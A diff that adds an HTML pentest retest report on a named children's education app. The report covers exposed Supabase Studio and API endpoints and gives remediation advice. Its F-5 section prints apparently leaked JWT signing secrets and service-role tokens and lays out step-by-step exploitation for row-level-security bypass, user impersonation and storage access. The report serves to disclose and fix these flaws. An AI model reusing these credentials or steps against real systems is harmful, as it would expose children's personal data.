@@ -1,0 +1,410 @@
+<!doctype html>
+<html lang="en" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>unomundi.com — Retest Delta — 2026-05-14</title>
+<style>
+:root{
+  --bg:#fafaf7;
+  --surface:#ffffff;
+  --ink:#1a1a1a;
+  --ink-soft:#4a4a4a;
+  --ink-mute:#7a7a7a;
+  --rule:#e6e3dc;
+  --accent:#1b4d3e;
+  --code-bg:#f3f1ec;
+  --code-ink:#1a1a1a;
+  --crit-bg:#fde9e7; --crit-ink:#7a1a14; --crit-border:#e9b9b3;
+  --high-bg:#fdf1dc; --high-ink:#7a4a0a; --high-border:#e9cf95;
+  --med-bg:#fff8d6;  --med-ink:#6a5500;  --med-border:#e2d066;
+  --ok-bg:#e3f1e3;   --ok-ink:#1b4d1b;   --ok-border:#b6d7b6;
+  --new-bg:#e2eaf5;  --new-ink:#16345d;  --new-border:#a9bcd6;
+}
+html[data-theme="dark"]{
+  --bg:#15171a;
+  --surface:#1c1f23;
+  --ink:#ececec;
+  --ink-soft:#c7c7c7;
+  --ink-mute:#9a9a9a;
+  --rule:#2c3036;
+  --accent:#8fd1bd;
+  --code-bg:#22262b;
+  --code-ink:#ececec;
+  --crit-bg:#3a1614; --crit-ink:#ffb8b1; --crit-border:#6a2924;
+  --high-bg:#3a2a10; --high-ink:#ffd699; --high-border:#6a4a20;
+  --med-bg:#3a3410;  --med-ink:#f5e88a;  --med-border:#6a6020;
+  --ok-bg:#1a3a1a;   --ok-ink:#bce8bc;   --ok-border:#2f5a2f;
+  --new-bg:#162335;  --new-ink:#b8cee8;  --new-border:#2c466a;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--ink)}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  font-size:15px;line-height:1.55;
+  -webkit-font-smoothing:antialiased;
+}
+main{max-width:920px;margin:0 auto;padding:48px 32px 80px}
+header.report{
+  border-bottom:1px solid var(--rule);
+  padding-bottom:24px;margin-bottom:32px;
+  display:flex;justify-content:space-between;align-items:flex-start;gap:24px;flex-wrap:wrap;
+}
+header.report h1{font-size:24px;font-weight:600;margin:0 0 6px;letter-spacing:-0.01em}
+header.report .meta{color:var(--ink-mute);font-size:13px;line-height:1.7}
+header.report .meta strong{color:var(--ink-soft);font-weight:500}
+.theme-toggle{
+  display:inline-flex;background:var(--surface);border:1px solid var(--rule);
+  border-radius:8px;padding:3px;font-size:12px;
+}
+.theme-toggle button{
+  background:transparent;border:0;color:var(--ink-soft);
+  padding:5px 10px;border-radius:6px;cursor:pointer;font:inherit;
+}
+.theme-toggle button[aria-pressed="true"]{background:var(--accent);color:#fff}
+html[data-theme="dark"] .theme-toggle button[aria-pressed="true"]{color:#0d1a16}
+h2{font-size:18px;font-weight:600;margin:36px 0 12px;letter-spacing:-0.005em}
+h3{font-size:15px;font-weight:600;margin:24px 0 10px;color:var(--ink-soft)}
+p{margin:0 0 12px;color:var(--ink-soft)}
+.summary{
+  background:var(--surface);border:1px solid var(--rule);
+  border-left:3px solid var(--accent);
+  padding:18px 22px;border-radius:6px;margin-bottom:28px;
+}
+.summary p{color:var(--ink);margin:0}
+.summary p + p{margin-top:10px}
+table{
+  width:100%;border-collapse:collapse;font-size:13.5px;
+  background:var(--surface);border:1px solid var(--rule);border-radius:6px;overflow:hidden;
+  margin:8px 0 20px;
+}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--rule);vertical-align:top}
+th{font-weight:600;color:var(--ink-soft);background:var(--code-bg);font-size:12px;text-transform:uppercase;letter-spacing:0.04em}
+tr:last-child td{border-bottom:0}
+td.id{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12.5px;color:var(--ink-mute);white-space:nowrap}
+.badge{
+  display:inline-block;padding:2px 8px;border-radius:999px;
+  font-size:11px;font-weight:600;letter-spacing:0.02em;
+  border:1px solid transparent;line-height:1.5;white-space:nowrap;
+}
+.b-crit{background:var(--crit-bg);color:var(--crit-ink);border-color:var(--crit-border)}
+.b-high{background:var(--high-bg);color:var(--high-ink);border-color:var(--high-border)}
+.b-med{background:var(--med-bg);color:var(--med-ink);border-color:var(--med-border)}
+.b-ok{background:var(--ok-bg);color:var(--ok-ink);border-color:var(--ok-border)}
+.b-new{background:var(--new-bg);color:var(--new-ink);border-color:var(--new-border)}
+pre,code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{
+  background:var(--code-bg);color:var(--code-ink);
+  padding:14px 16px;border-radius:6px;font-size:12.5px;line-height:1.5;
+  overflow-x:auto;border:1px solid var(--rule);margin:8px 0 16px;
+}
+code{background:var(--code-bg);padding:1px 5px;border-radius:3px;font-size:0.92em}
+ol,ul{padding-left:22px;color:var(--ink-soft)}
+ol li,ul li{margin-bottom:6px}
+.steps{counter-reset:step;list-style:none;padding-left:0}
+.steps>li{
+  counter-increment:step;position:relative;padding:0 0 14px 36px;
+}
+.steps>li::before{
+  content:counter(step);position:absolute;left:0;top:0;
+  width:24px;height:24px;border-radius:50%;
+  background:var(--accent);color:#fff;font-size:12px;font-weight:600;
+  display:flex;align-items:center;justify-content:center;
+}
+html[data-theme="dark"] .steps>li::before{color:#0d1a16}
+.callout{
+  background:var(--crit-bg);border:1px solid var(--crit-border);color:var(--crit-ink);
+  padding:14px 18px;border-radius:6px;margin:16px 0;font-size:13.5px;
+}
+.callout strong{color:var(--crit-ink)}
+footer.report{
+  border-top:1px solid var(--rule);margin-top:48px;padding-top:18px;
+  color:var(--ink-mute);font-size:12px;
+}
+@media print{
+  :root{--bg:#fff;--surface:#fff}
+  body{font-size:11pt;color:#000}
+  .theme-toggle{display:none}
+  main{padding:0;max-width:none}
+  pre,table,.summary,.callout{break-inside:avoid;page-break-inside:avoid}
+  header.report{border-bottom:1px solid #000}
+  table{font-size:9.5pt}
+  pre{font-size:9pt;border-color:#999}
+  a{color:#000;text-decoration:underline}
+}
+</style>
+</head>
+<body>
+<main>
+
+<header class="report">
+  <div>
+    <h1>unomundi.com — Retest delta</h1>
+    <div class="meta">
+      <strong>Engagement:</strong> authorized pentest, self-attested by operator<br>
+      <strong>Original test:</strong> 2026-05-05<br>
+      <strong>Rescan:</strong> 2026-05-14<br>
+      <strong>Target:</strong> unomundi.com (NL, kids' education app, ages 6 to 12)<br>
+      <strong>Scope:</strong> remediation re-verification, structural probing only, no SQL, no exfiltration
+    </div>
+  </div>
+  <div class="theme-toggle" role="group" aria-label="Theme">
+    <button data-theme-set="light" aria-pressed="true">Light</button>
+    <button data-theme-set="dark" aria-pressed="false">Dark</button>
+    <button data-theme-set="system" aria-pressed="false">System</button>
+  </div>
+</header>
+
+<section class="summary">
+  <p><strong>Headline:</strong> partial remediation. Network-layer hardening closed the Kong gateway on dev. Basic Auth was added in front of dev Studio UI. The original critical (unauthenticated self-hosted Supabase Studio on the production-named host) is unchanged.</p>
+  <p><strong>New critical:</strong> the project's <code>jwt_secret</code>, the pre-minted <code>service_role</code> JWT, and the <code>anon</code> JWT are all returned by an unauthenticated endpoint. The leaked service_role token is valid until <strong>2031-03-02</strong>. No forging required; this is a copy-paste credential.</p>
+</section>
+
+<h2>Findings table</h2>
+<table>
+  <thead>
+    <tr><th>ID</th><th>Title</th><th>Severity</th><th>2026-05-05</th><th>2026-05-14</th><th>Delta</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="id">F-1a</td>
+      <td>Studio publicly accessible on supabase.unomundi.com</td>
+      <td><span class="badge b-crit">Critical</span></td>
+      <td>Open, unauth</td>
+      <td>Open, unauth</td>
+      <td><span class="badge b-crit">Not remediated</span></td>
+    </tr>
+    <tr>
+      <td class="id">F-1b</td>
+      <td>Studio publicly accessible on dev-supabase.unomundi.com</td>
+      <td><span class="badge b-crit">Critical</span></td>
+      <td>Open, unauth</td>
+      <td>HTTP Basic Auth on Studio paths only</td>
+      <td><span class="badge b-med">Partial</span></td>
+    </tr>
+    <tr>
+      <td class="id">F-2</td>
+      <td>Kong API gateway exposed on dev-supabase:8000 and :8443</td>
+      <td><span class="badge b-high">High</span></td>
+      <td>Open</td>
+      <td>TCP refused</td>
+      <td><span class="badge b-ok">Remediated</span></td>
+    </tr>
+    <tr>
+      <td class="id">F-3</td>
+      <td>Prod admin SPA hardcodes dev-supabase as backend</td>
+      <td><span class="badge b-high">High</span></td>
+      <td>Open</td>
+      <td>Same bundle, same dev URL</td>
+      <td><span class="badge b-crit">Not remediated</span></td>
+    </tr>
+    <tr>
+      <td class="id">F-4</td>
+      <td>PostgREST <code>/rest/v1/</code> on dev-supabase reachable without basic auth</td>
+      <td><span class="badge b-high">High</span></td>
+      <td>Not separately tracked</td>
+      <td>200, returns OpenAPI schema</td>
+      <td><span class="badge b-new">Newly itemised</span></td>
+    </tr>
+    <tr>
+      <td class="id">F-5</td>
+      <td>jwt_secret + service_role JWT + anon JWT leaked unauthenticated</td>
+      <td><span class="badge b-crit">Critical</span></td>
+      <td>Not previously found</td>
+      <td>Open, JWT valid through 2031-03-02</td>
+      <td><span class="badge b-new">New critical</span></td>
+    </tr>
+    <tr>
+      <td class="id">F-6</td>
+      <td>api.unomundi.com Swagger UI exposed at <code>/docs</code></td>
+      <td><span class="badge b-med">Medium</span></td>
+      <td>404, not catalogued</td>
+      <td>200, Scalar API reference</td>
+      <td><span class="badge b-new">New surface</span></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>F-5 deep dive, how the JWT leak works in practice</h2>
+
+<h3>The leak</h3>
+<p>An unauthenticated HTTP GET against the Studio platform API on the production-named host returns 977 bytes of infrastructure metadata, including the project signing secret and both pre-minted JWTs.</p>
+
+<pre>GET https://supabase.unomundi.com/api/platform/projects/default/settings
+
+200 OK  application/json  977 bytes
+
+{
+  "app_config": {
+    "db_schema":   "public",
+    "endpoint":    "100.52.182.111:8000",
+    "storage_endpoint": "100.52.182.111:8000",
+    "protocol":    "http"
+  },
+  "db_host":   "localhost",
+  "db_port":   5432,
+  "db_user":   "postgres",
+  "db_name":   "postgres",
+  "jwt_secret": "vG3d9Z2h8aW4fK1sJ7YvL5pR6xQ0tB9eD3yF6kL1mN4oP2qR",
+  "service_api_keys": [
+    { "name": "service_role key", "tags": "service_role",
+      "api_key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic2VydmljZV9yb2xlIiwi
+                  aXNzIjoic3VwYWJhc2UiLCJpYXQiOjE3NzI1NjU3NzMsImV4cCI6MTkzMDI0NTc3M30.
+                  HNUToHRtiGoRztMU6Bpja62fXNOaCqaDDKL6n9Ru16Q" },
+    { "name": "anon key",         "tags": "anon",
+      "api_key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlzcyI6Inn1
+                  cGFiYXNlIiwiaWF0IjoxNzcyNTY1NzczLCJleHAiOjE5MzAyNDU3NzN9.
+                  -f3JG6tjVe9OcclTXQ9Mb7ApDwbLuWVD6G8h9L-eWEI" }
+  ]
+}</pre>
+
+<p>Decoded service_role JWT:</p>
+<pre>header  : {"alg":"HS256","typ":"JWT"}
+payload : {"role":"service_role","iss":"supabase","iat":1772565773,"exp":1930245773}
+iat     : 2026-03-03 19:22:53 UTC
+exp     : 2031-03-02 19:22:53 UTC   (4 years 9 months remaining)</pre>
+
+<h3>What service_role grants</h3>
+<p>In a self-hosted Supabase stack, <code>service_role</code> is the privilege tier that bypasses every Row Level Security policy and connects to PostgREST as the equivalent of a database-superuser-scoped role. With one bearer token the holder can:</p>
+<ul>
+  <li>Read every row of every table, including <code>guardian_*</code>, <code>consent_records</code>, <code>explorer_profiles</code>, and the auth schema.</li>
+  <li>Insert, update, delete arbitrary rows.</li>
+  <li>Call RPC functions, including ones that wrap privileged operations.</li>
+  <li>Hit GoTrue admin endpoints to enumerate users, reset passwords, mint impersonation links.</li>
+  <li>Hit Storage to read or delete any object in any bucket regardless of bucket policy.</li>
+</ul>
+
+<h3>Step-by-step practical exploit</h3>
+<ol class="steps">
+  <li>
+    <strong>Pull the credential.</strong> One anonymous HTTP GET to
+    <code>/api/platform/projects/default/settings</code> on supabase.unomundi.com.
+    No credentials needed, no rate limit observed on the rescan.
+  </li>
+  <li>
+    <strong>Resolve a reachable data plane.</strong> Two paths exist today.
+    The public one is <code>https://dev-supabase.unomundi.com/rest/v1/</code>,
+    confirmed reachable from the public internet (HTTP 200, returns the
+    full OpenAPI schema). The nginx Basic Auth rule covers Studio UI paths
+    only; <code>/rest/v1</code> is not gated. The internal Kong at
+    100.52.182.111:8000 is VPC-internal and would need a pivot, which
+    is unnecessary given the public path.
+  </li>
+  <li>
+    <strong>Send authenticated requests with the leaked token.</strong>
+    Against any PostgREST endpoint on dev-supabase:
+    <pre>GET https://dev-supabase.unomundi.com/rest/v1/&lt;table&gt;
+apikey:        &lt;leaked service_role JWT&gt;
+Authorization: Bearer &lt;leaked service_role JWT&gt;</pre>
+    PostgREST verifies the HS256 signature against <code>jwt_secret</code>,
+    reads <code>role: service_role</code> from the payload, switches the
+    Postgres session role, and bypasses every RLS policy on the queried
+    relation.
+  </li>
+  <li>
+    <strong>Pivot.</strong> The same token authorises GoTrue admin endpoints
+    and Storage. From a single anonymous GET the attacker reaches full
+    read-write on every GDPR-K relevant table on a children's app, plus the
+    ability to impersonate any user.
+  </li>
+</ol>
+
+<div class="callout">
+  <strong>Important:</strong> rotating the two pre-minted JWTs is not sufficient on its own. If the operator rotates the tokens but does not remove the unauthenticated <code>/api/platform/projects/default/settings</code> endpoint, an attacker simply re-reads the new <code>jwt_secret</code> from the same response and mints a fresh service_role JWT locally with a 10-year expiry. The endpoint itself must stop being publicly reachable.
+</div>
+
+<h3>Other surfaces the leaked credentials unlock</h3>
+<table>
+  <thead>
+    <tr><th>Endpoint family</th><th>What service_role grants</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>/rest/v1/&lt;table&gt;</code></td><td>Read or write every table, ignore RLS</td></tr>
+    <tr><td><code>/rest/v1/rpc/&lt;fn&gt;</code></td><td>Invoke any database function regardless of grant</td></tr>
+    <tr><td><code>/auth/v1/admin/users</code></td><td>Enumerate, create, delete users; reset passwords</td></tr>
+    <tr><td><code>/auth/v1/admin/generate_link</code></td><td>Mint magic-link or recovery tokens for any user (full impersonation)</td></tr>
+    <tr><td><code>/storage/v1/object/&lt;bucket&gt;/&lt;path&gt;</code></td><td>Read or delete any object in any bucket</td></tr>
+    <tr><td><code>/pg/*</code>, <code>/realtime/*</code></td><td>Database event streaming, schema introspection (where exposed)</td></tr>
+  </tbody>
+</table>
+
+<h2>F-3 evidence, admin still points at dev backend</h2>
+<p>The bundle served at <code>admin.unomundi.com/assets/index-LVG8KGiM.js</code> is 1,476,471 bytes, dated 2026-04-27, still the active script referenced from <code>index.html</code>. It contains exactly one production Supabase URL:</p>
+<pre>$ grep -oE 'https://[a-z0-9.-]+\.unomundi\.com' index-LVG8KGiM.js | sort -u
+https://dev-supabase.unomundi.com</pre>
+<p>Build-time env literals visible in the bundle: <code>VITE_SUPABASE_URL</code>, <code>VITE_SUPABASE_ANON_KEY</code>, <code>VITE_BACKEND_URL</code>. There is no prod-only Supabase host. Admins logging in at admin.unomundi.com are talking to the dev backend, whose data API is publicly reachable, whose Basic Auth covers Studio UI only, and whose JWTs are the ones leaked on the prod host.</p>
+
+<h2>F-2 evidence, Kong ports closed</h2>
+<pre>$ curl -I https://dev-supabase.unomundi.com:8000/
+curl: (7) Failed to connect ... Couldn't connect to server
+
+$ curl -I https://dev-supabase.unomundi.com:8443/
+curl: (7) Failed to connect ... Couldn't connect to server</pre>
+<p>This is hardening, not full mitigation. The data plane remains reachable through nginx on port 443.</p>
+
+<h2>Recommendations, ordered by blast radius</h2>
+<ol>
+  <li><strong>Rotate <code>jwt_secret</code> and re-mint both JWTs immediately.</strong> Treat the 2026-03-03 keypair as fully burned. Any integration holding the old anon key needs updating as part of rotation.</li>
+  <li><strong>Remove public reachability of supabase.unomundi.com and dev-supabase.unomundi.com.</strong> Self-hosted Studio is a management plane; it belongs behind a VPN, SSO, or IP allowlist, not a public hostname. The current Basic Auth is a single shared password protecting a privileged surface and does not cover <code>/rest/v1/</code>.</li>
+  <li><strong>Repoint admin.unomundi.com at a real production Supabase project,</strong> with separate JWT keys and an isolated database. Rebuild the admin SPA with a prod-only <code>VITE_SUPABASE_URL</code>.</li>
+  <li><strong>Audit <code>/api/platform/*</code> exposure on both Supabase hosts.</strong> The Next.js Studio app ships a platform API that returns infrastructure secrets when it believes it is running on localhost. It must not be reachable unauthenticated.</li>
+  <li><strong>Database and Storage log review for 2026-03-03 onward.</strong> With a 4-year-old service_role JWT and an unauthenticated leak path, prior abuse is plausible and must be checked. Pull <code>pg_stat_statements</code>, GoTrue audit logs, and Storage access logs for anomalies, in particular reads of <code>guardian_*</code> or <code>consent_records</code> from non-application source IPs.</li>
+  <li><strong>GDPR Art. 33 clock.</strong> If the log review surfaces evidence of unauthorised access to children's PII, the 72h notification to the AP (Autoriteit Persoonsgegevens) applies. Coordinate with the DPO before the window closes.</li>
+  <li><strong>Remove or auth-gate <code>api.unomundi.com/docs</code></strong> (Scalar API reference), unless intentional for the public.</li>
+</ol>
+
+<h2>Methodology and limits</h2>
+<p>This rescan used anonymous HTTP HEAD and GET requests against documented Supabase Studio platform endpoints and against the admin SPA. No authenticated requests were made. No SQL was executed. No user records were read. No data was exfiltrated beyond the management-plane responses cited above. The leaked JWTs were not used against any endpoint.</p>
+<p>Structural proof in this report is sufficient to characterise remediation state. Further proof would require crossing into active exploitation, which is out of scope.</p>
+
+<h2>Evidence index</h2>
+<table>
+  <thead><tr><th>File</th><th>Content</th></tr></thead>
+  <tbody>
+    <tr><td><code>evidence/01-supabase-root.txt</code></td><td>307 redirect to /project/default, no auth</td></tr>
+    <tr><td><code>evidence/02-supabase-profile.txt</code></td><td>200, default johndoe demo profile</td></tr>
+    <tr><td><code>evidence/03-supabase-project.txt</code></td><td>200, Default Project metadata</td></tr>
+    <tr><td><code>evidence/04-supabase-settings-JWT-LEAK.txt</code></td><td>200, jwt_secret + service_role + anon JWTs</td></tr>
+    <tr><td><code>evidence/05-dev-supabase-root-401.txt</code></td><td>401 Basic Auth (Restricted Studio)</td></tr>
+    <tr><td><code>evidence/06-dev-supabase-profile-401.txt</code></td><td>401 Basic Auth</td></tr>
+    <tr><td><code>evidence/07-dev-supabase-rest-OPEN.txt</code></td><td>200 OpenAPI JSON, basic auth absent on /rest/v1/</td></tr>
+    <tr><td><code>evidence/08-kong-ports-closed.txt</code></td><td>TCP refused on 8000/8443</td></tr>
+    <tr><td><code>evidence/09-admin-index.txt</code></td><td>200, references index-LVG8KGiM.js</td></tr>
+    <tr><td><code>evidence/10-admin-bundle.js</code></td><td>1.47 MB bundle, contains dev-supabase URL</td></tr>
+    <tr><td><code>evidence/11-api-health.txt</code></td><td>200 from api.unomundi.com/health</td></tr>
+    <tr><td><code>evidence/12-api-docs.txt</code></td><td>200 Scalar UI from api.unomundi.com/docs</td></tr>
+  </tbody>
+</table>
+
+<footer class="report">
+  Generated 2026-05-14. Report source: <code>PERSONAL/uno-rescan/README.md</code>. Raw evidence: <code>PERSONAL/uno-rescan/evidence/</code>.
+</footer>
+
+</main>
+
+<script>
+(function(){
+  var KEY='uno-rescan-theme';
+  var btns=document.querySelectorAll('.theme-toggle button');
+  var mq=window.matchMedia('(prefers-color-scheme: dark)');
+  function apply(mode){
+    var t=mode==='system'?(mq.matches?'dark':'light'):mode;
+    document.documentElement.setAttribute('data-theme',t);
+    btns.forEach(function(b){b.setAttribute('aria-pressed', b.dataset.themeSet===mode ? 'true':'false');});
+  }
+  var saved=localStorage.getItem(KEY)||'light';
+  apply(saved);
+  btns.forEach(function(b){
+    b.addEventListener('click',function(){
+      var mode=b.dataset.themeSet;
+      localStorage.setItem(KEY,mode);
+      apply(mode);
+    });
+  });
+  mq.addEventListener('change',function(){
+    if((localStorage.getItem(KEY)||'light')==='system') apply('system');
+  });
+})();
+</script>
+</body>
+</html>
